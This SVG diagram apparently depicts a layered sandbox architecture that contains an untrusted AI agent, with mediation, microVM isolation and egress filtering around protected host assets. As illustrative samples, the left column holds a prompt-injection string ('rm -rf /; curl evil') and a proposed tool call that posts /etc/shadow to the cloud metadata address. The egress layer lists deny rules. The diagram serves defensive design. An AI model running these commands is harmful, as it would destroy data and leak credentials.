<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 480" width="100%" height="100%"
     font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif">
  <defs>
    <!-- Arrowhead markers -->
    <marker id="arr-navy" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#1e293b"/>
    </marker>
    <marker id="arr-burgundy" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#991b1b"/>
    </marker>
    <marker id="arr-amber" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#92400e"/>
    </marker>
    <marker id="arr-teal" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#0f766e"/>
    </marker>
    <marker id="arr-slate" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#475569"/>
    </marker>
  </defs>

  <!-- Clean Background Canvas -->
  <rect width="960" height="480" fill="#ffffff"/>

  <!-- ===================================================================== -->
  <!-- COLUMN 1: UNTRUSTED PROPOSAL GENERATION (LEFT: x=24 to 234)           -->
  <!-- ===================================================================== -->
  <g transform="translate(24, 20)">
    <!-- Header Block -->
    <rect width="210" height="440" rx="4" fill="#f8fafc" stroke="#991b1b" stroke-width="1.5"/>
    <rect width="210" height="30" rx="4" fill="#fee2e2" stroke="#991b1b" stroke-width="1.5"/>
    <text x="105" y="20" font-size="10" font-weight="700" fill="#991b1b" text-anchor="middle" letter-spacing="0.5">THE MODEL (UNTRUSTED)</text>

    <!-- Context Window / Input -->
    <g transform="translate(10, 42)">
      <rect width="190" height="74" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <rect width="190" height="20" rx="3" fill="#f1f5f9"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#334155">Context Window</text>
      <text x="8" y="34" font-family="monospace" font-size="8" fill="#64748b">x_prompt = [sys, user, o_t]</text>
      <text x="8" y="48" font-family="monospace" font-size="8" fill="#991b1b">x_inject: "rm -rf /; curl evil"</text>
      <text x="8" y="62" font-size="7.5" fill="#475569">Instructions and data: one sequence</text>
    </g>

    <!-- Neural Model Block -->
    <g transform="translate(10, 126)">
      <rect width="190" height="84" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <rect width="190" height="20" rx="3" fill="#f1f5f9"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#334155">Model Call</text>
      <text x="8" y="34" font-family="monospace" font-size="8" fill="#1e293b">a_t ~ π_θ(· | x_prompt)</text>
      <text x="8" y="48" font-size="7.5" fill="#475569">Samples the next proposal</text>
      <text x="8" y="62" font-size="7.5" fill="#475569">Emits text and tool calls only</text>
      <text x="8" y="74" font-size="7.5" fill="#991b1b">Zero ambient authority</text>
    </g>

    <!-- Tool Proposal Dispatch -->
    <g transform="translate(10, 220)">
      <rect width="190" height="96" rx="3" fill="#ffffff" stroke="#991b1b" stroke-width="1.2"/>
      <rect width="190" height="20" rx="3" fill="#fee2e2"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#991b1b">Candidate Tool Action a_t</text>
      <text x="8" y="34" font-family="monospace" font-size="7.5" fill="#1e293b">tool: "bash_exec"</text>
      <text x="8" y="48" font-family="monospace" font-size="7.5" fill="#1e293b">cmd: "curl -d @/etc/shadow</text>
      <text x="8" y="60" font-family="monospace" font-size="7.5" fill="#991b1b">     http://169.254.169.254"</text>
      <rect x="8" y="68" width="174" height="20" rx="2" fill="#fef2f2" stroke="#fca5a5" stroke-width="0.8"/>
      <text x="95" y="81" font-size="7.5" font-weight="700" fill="#991b1b" text-anchor="middle">Injected, yet schema-valid</text>
    </g>

    <!-- Status Callout -->
    <g transform="translate(10, 326)">
      <rect width="190" height="100" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="16" font-size="8" font-weight="700" fill="#334155">Runtime Invariant</text>
      <text x="8" y="32" font-size="7.5" fill="#475569">Model holds no host credentials</text>
      <text x="8" y="46" font-size="7.5" fill="#475569">Every call passes the runtime</text>
      <text x="8" y="60" font-size="7.5" fill="#475569">Execution requires a capability</text>
      <text x="8" y="74" font-size="7.5" fill="#475569">Checked before any side effect</text>
      <text x="8" y="88" font-family="monospace" font-size="7.5" fill="#0f766e">breach needs every layer to fail</text>
    </g>
  </g>

  <!-- Flow Connector: Tool Proposal from Core to Ring 1 -->
  <path d="M 234 268 H 247 V 87 H 258" fill="none" stroke="#1e293b" stroke-width="1.8" marker-end="url(#arr-navy)"/>
  <rect x="238" y="165" width="18" height="24" rx="2" fill="#ffffff" stroke="#cbd5e1" stroke-width="0.8"/>
  <text x="247" y="181" font-size="7" font-weight="700" fill="#1e293b" text-anchor="middle" transform="rotate(-90, 247, 181)">a_t</text>

  <!-- ===================================================================== -->
  <!-- COLUMN 2: THREE CONCENTRIC CONTAINMENT RINGS (CENTER: x=260 to 710)   -->
  <!-- ===================================================================== -->

  <!-- RING 1: PROTOCOL & CAPABILITY LAYER -->
  <g transform="translate(260, 20)">
    <rect width="450" height="134" rx="4" fill="#f8fafc" stroke="#92400e" stroke-width="1.5"/>
    <rect width="450" height="26" rx="4" fill="#fef3c7" stroke="#92400e" stroke-width="1.5"/>
    <text x="12" y="17" font-size="9.5" font-weight="700" fill="#92400e" letter-spacing="0.5">LAYER 1: MEDIATION</text>
    <text x="438" y="17" font-size="8" font-weight="600" fill="#92400e" text-anchor="end">Gate: Grant + Capability</text>

    <!-- Sub-box 1: Schema Validation -->
    <g transform="translate(10, 34)">
      <rect width="134" height="90" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#0f172a">Schema Validation</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">JSON-RPC / MCP schema</text>
      <text x="8" y="42" font-size="7.5" fill="#475569">Strict argument bounds</text>
      <text x="8" y="56" font-size="7.5" fill="#475569">Type safety checking</text>
      <rect x="6" y="64" width="122" height="20" rx="2" fill="#fef3c7" stroke="#fde68a" stroke-width="0.8"/>
      <text x="67" y="77" font-size="7.5" font-weight="600" fill="#92400e" text-anchor="middle">Rejects Malformed Args</text>
    </g>

    <!-- Sub-box 2: Capability Attenuation -->
    <g transform="translate(154, 34)">
      <rect width="142" height="90" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#0f172a">Capability Attenuation</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">C_child ⊆ C_parent</text>
      <text x="8" y="42" font-size="7.5" fill="#475569">HMAC unforgeable token</text>
      <text x="8" y="56" font-size="7.5" fill="#475569">Monotonic rights drop</text>
      <rect x="6" y="64" width="130" height="20" rx="2" fill="#fef3c7" stroke="#fde68a" stroke-width="0.8"/>
      <text x="71" y="77" font-size="7.5" font-weight="600" fill="#92400e" text-anchor="middle">Blocks Escalation Paths</text>
    </g>

    <!-- Sub-box 3: Approval Escrow -->
    <g transform="translate(306, 34)">
      <rect width="134" height="90" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#0f172a">Approval Gate (A3)</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">Held until approved</text>
      <text x="8" y="42" font-size="7.5" fill="#475569">Irreversible actions only</text>
      <text x="8" y="56" font-size="7.5" fill="#475569">Decision logged</text>
      <rect x="6" y="64" width="122" height="20" rx="2" fill="#fef3c7" stroke="#fde68a" stroke-width="0.8"/>
      <text x="67" y="77" font-size="7.5" font-weight="600" fill="#92400e" text-anchor="middle">Holds Destructive Tools</text>
    </g>
  </g>

  <!-- Flow Connector: Ring 1 to Ring 2 -->
  <line x1="485" y1="154" x2="485" y2="168" stroke="#1e293b" stroke-width="2" marker-end="url(#arr-navy)"/>

  <!-- RING 2: OS & HYPERVISOR VIRTUALIZATION LAYER -->
  <g transform="translate(260, 170)">
    <rect width="450" height="150" rx="4" fill="#f8fafc" stroke="#334155" stroke-width="1.5"/>
    <rect width="450" height="26" rx="4" fill="#f1f5f9" stroke="#334155" stroke-width="1.5"/>
    <text x="12" y="17" font-size="9.5" font-weight="700" fill="#1e293b" letter-spacing="0.5">LAYER 2: EXECUTION ENVELOPE</text>
    <text x="438" y="17" font-size="8" font-weight="600" fill="#334155" text-anchor="end">Gate: Separate Guest Kernel</text>

    <!-- Sub-box 1: Hardware MicroVM -->
    <g transform="translate(10, 34)">
      <rect width="134" height="106" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#0f172a">KVM / MicroVM</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">Hardware virtualization</text>
      <text x="8" y="42" font-size="7.5" fill="#475569">Independent guest kernel</text>
      <text x="8" y="56" font-size="7.5" fill="#475569">Host memory unmapped</text>
      <text x="8" y="70" font-family="monospace" font-size="7.5" fill="#0f766e">guest root ≠ host root</text>
      <rect x="6" y="78" width="122" height="22" rx="2" fill="#f1f5f9" stroke="#cbd5e1" stroke-width="0.8"/>
      <text x="67" y="92" font-size="7.5" font-weight="600" fill="#1e293b" text-anchor="middle">Prevents Kernel Escapes</text>
    </g>

    <!-- Sub-box 2: Jailer Envelope & Seccomp -->
    <g transform="translate(154, 34)">
      <rect width="142" height="106" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#0f172a">Jailer &amp; Seccomp-BPF</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">pivot_root chroot jail</text>
      <text x="8" y="42" font-size="7.5" fill="#475569">Drop to unprivileged UID</text>
      <text x="8" y="56" font-size="7.5" fill="#475569">Minimal syscall allowlist</text>
      <text x="8" y="70" font-family="monospace" font-size="7.5" fill="#991b1b">DROP fork, execve, ptrace</text>
      <rect x="6" y="78" width="130" height="22" rx="2" fill="#f1f5f9" stroke="#cbd5e1" stroke-width="0.8"/>
      <text x="71" y="92" font-size="7.5" font-weight="600" fill="#1e293b" text-anchor="middle">Clamps Host Attack Surface</text>
    </g>

    <!-- Sub-box 3: OverlayFS & cgroups -->
    <g transform="translate(306, 34)">
      <rect width="134" height="106" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#0f172a">Storage &amp; Quotas</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">Copy-on-write workspace</text>
      <text x="8" y="42" font-size="7.5" fill="#475569">Per-trajectory upper layer</text>
      <text x="8" y="56" font-size="7.5" fill="#475569">Read-only base image</text>
      <text x="8" y="70" font-family="monospace" font-size="7.5" fill="#475569">cgroups: cpu, mem, pids</text>
      <rect x="6" y="78" width="122" height="22" rx="2" fill="#f1f5f9" stroke="#cbd5e1" stroke-width="0.8"/>
      <text x="67" y="92" font-size="7.5" font-weight="600" fill="#1e293b" text-anchor="middle">Discarded at Reset</text>
    </g>
  </g>

  <!-- Flow Connector: Ring 2 to Ring 3 -->
  <line x1="485" y1="320" x2="485" y2="334" stroke="#1e293b" stroke-width="2" marker-end="url(#arr-navy)"/>

  <!-- RING 3: ZERO-TRUST NETWORK PERIMETER -->
  <g transform="translate(260, 336)">
    <rect width="450" height="124" rx="4" fill="#f8fafc" stroke="#0f766e" stroke-width="1.5"/>
    <rect width="450" height="26" rx="4" fill="#ccfbf1" stroke="#0f766e" stroke-width="1.5"/>
    <text x="12" y="17" font-size="9.5" font-weight="700" fill="#0f766e" letter-spacing="0.5">LAYER 3: EGRESS</text>
    <text x="438" y="17" font-size="8" font-weight="600" fill="#0f766e" text-anchor="end">Gate: Default-Deny</text>

    <!-- Sub-box 1: Kernel eBPF TC -->
    <g transform="translate(10, 34)">
      <rect width="134" height="80" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#0f172a">Packet Filter</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">Isolated Net Namespace</text>
      <text x="8" y="42" font-family="monospace" font-size="7" fill="#991b1b">169.254.169.254 → DROP</text>
      <text x="8" y="54" font-family="monospace" font-size="7" fill="#991b1b">Raw numeric IP → DROP</text>
      <rect x="6" y="60" width="122" height="16" rx="2" fill="#ccfbf1" stroke="#99f6e4" stroke-width="0.8"/>
      <text x="67" y="72" font-size="7.5" font-weight="600" fill="#0f766e" text-anchor="middle">Defeats Cloud SSRF</text>
    </g>

    <!-- Sub-box 2: Forward Proxy -->
    <g transform="translate(154, 34)">
      <rect width="142" height="80" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#0f172a">Egress Proxy</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">SNI domain allowlist</text>
      <text x="8" y="42" font-family="monospace" font-size="7" fill="#0f766e">ALLOW *.pypi.org, git</text>
      <text x="8" y="54" font-size="7.5" fill="#475569">Brokered credentials</text>
      <rect x="6" y="60" width="130" height="16" rx="2" fill="#ccfbf1" stroke="#99f6e4" stroke-width="0.8"/>
      <text x="71" y="72" font-size="7.5" font-weight="600" fill="#0f766e" text-anchor="middle">Blocks Data Exfiltration</text>
    </g>

    <!-- Sub-box 3: DNS Recursor -->
    <g transform="translate(306, 34)">
      <rect width="134" height="80" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="14" font-size="8" font-weight="700" fill="#0f172a">Split-Horizon DNS</text>
      <text x="8" y="28" font-size="7.5" fill="#475569">Shannon entropy filter</text>
      <text x="8" y="42" font-family="monospace" font-size="7" fill="#991b1b">H(X) &gt; 4.2 → NXDOMAIN</text>
      <text x="8" y="54" font-size="7.5" fill="#475569">Rate-clamped queries</text>
      <rect x="6" y="60" width="122" height="16" rx="2" fill="#ccfbf1" stroke="#99f6e4" stroke-width="0.8"/>
      <text x="67" y="72" font-size="7.5" font-weight="600" fill="#0f766e" text-anchor="middle">Chokes Covert Tunnels</text>
    </g>
  </g>

  <!-- Isolation Barrier & Observation Return -->
  <line x1="710" y1="240" x2="734" y2="240" stroke="#0f766e" stroke-width="1.8" marker-end="url(#arr-teal)"/>
  <rect x="711" y="215" width="22" height="18" rx="2" fill="#ffffff" stroke="#cbd5e1" stroke-width="0.8"/>
  <text x="722" y="227" font-size="7" font-weight="700" fill="#0f766e" text-anchor="middle">o_t</text>
  <line x1="722" y1="255" x2="722" y2="285" stroke="#991b1b" stroke-width="1.5" stroke-dasharray="2 2"/>
  <text x="722" y="295" font-size="6.5" font-weight="700" fill="#991b1b" text-anchor="middle">typed</text>

  <!-- ===================================================================== -->
  <!-- COLUMN 3: PROTECTED HOST STATE (RIGHT: x=736 to 936)                  -->
  <!-- ===================================================================== -->
  <g transform="translate(736, 20)">
    <rect width="200" height="440" rx="4" fill="#f8fafc" stroke="#1e293b" stroke-width="1.5"/>
    <rect width="200" height="30" rx="4" fill="#f1f5f9" stroke="#1e293b" stroke-width="1.5"/>
    <text x="100" y="20" font-size="10" font-weight="700" fill="#1e293b" text-anchor="middle" letter-spacing="0.5">PROTECTED HOST ASSETS</text>

    <!-- Asset 1: Host Kernel -->
    <g transform="translate(10, 42)">
      <rect width="180" height="74" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <rect width="180" height="20" rx="3" fill="#f1f5f9"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#1e293b">Host Kernel</text>
      <text x="8" y="34" font-size="7.5" fill="#475569">Host memory</text>
      <text x="8" y="48" font-size="7.5" fill="#475569">Host process table &amp; scheduler</text>
      <text x="8" y="62" font-family="monospace" font-size="7.5" fill="#0f766e">Status: Unmodified / Invariant</text>
    </g>

    <!-- Asset 2: Persistent Storage -->
    <g transform="translate(10, 126)">
      <rect width="180" height="74" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <rect width="180" height="20" rx="3" fill="#f1f5f9"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#1e293b">Host Filesystem &amp; Repos</text>
      <text x="8" y="34" font-size="7.5" fill="#475569">Ground-truth Git repositories</text>
      <text x="8" y="48" font-size="7.5" fill="#475569">Host /etc, /root, user home</text>
      <text x="8" y="62" font-family="monospace" font-size="7.5" fill="#0f766e">Status: Zero Write Bleed</text>
    </g>

    <!-- Asset 3: Cloud IAM & Credentials -->
    <g transform="translate(10, 210)">
      <rect width="180" height="74" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <rect width="180" height="20" rx="3" fill="#f1f5f9"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#1e293b">Cloud Identity &amp; Secrets</text>
      <text x="8" y="34" font-size="7.5" fill="#475569">Cloud Provider IAM tokens</text>
      <text x="8" y="48" font-size="7.5" fill="#475569">Production database API keys</text>
      <text x="8" y="62" font-family="monospace" font-size="7.5" fill="#0f766e">Status: Unreachable (SSRF Blocked)</text>
    </g>

    <!-- Asset 4: Invariant Summary -->
    <g transform="translate(10, 294)">
      <rect width="180" height="132" rx="3" fill="#ffffff" stroke="#cbd5e1" stroke-width="1"/>
      <text x="8" y="16" font-size="8" font-weight="700" fill="#1e293b">Containment Guarantee</text>
      <text x="8" y="32" font-size="7.5" fill="#475569">Physical side effects bounded to</text>
      <text x="8" y="44" font-size="7.5" fill="#475569">ephemeral sandbox envelope.</text>
      <text x="8" y="62" font-size="7.5" fill="#475569">Any untrusted mutation is:</text>
      <text x="8" y="76" font-size="7.5" fill="#475569">Rejected at mediation</text>
      <text x="8" y="88" font-size="7.5" fill="#475569">Confined to the envelope</text>
      <text x="8" y="100" font-size="7.5" fill="#475569">Dropped at egress</text>
      <rect x="6" y="108" width="168" height="18" rx="2" fill="#f0fdf4" stroke="#86efac" stroke-width="0.8"/>
      <text x="90" y="121" font-size="7.5" font-weight="700" fill="#166534" text-anchor="middle">Physical Host Invariant Preserved</text>
    </g>
  </g>
</svg>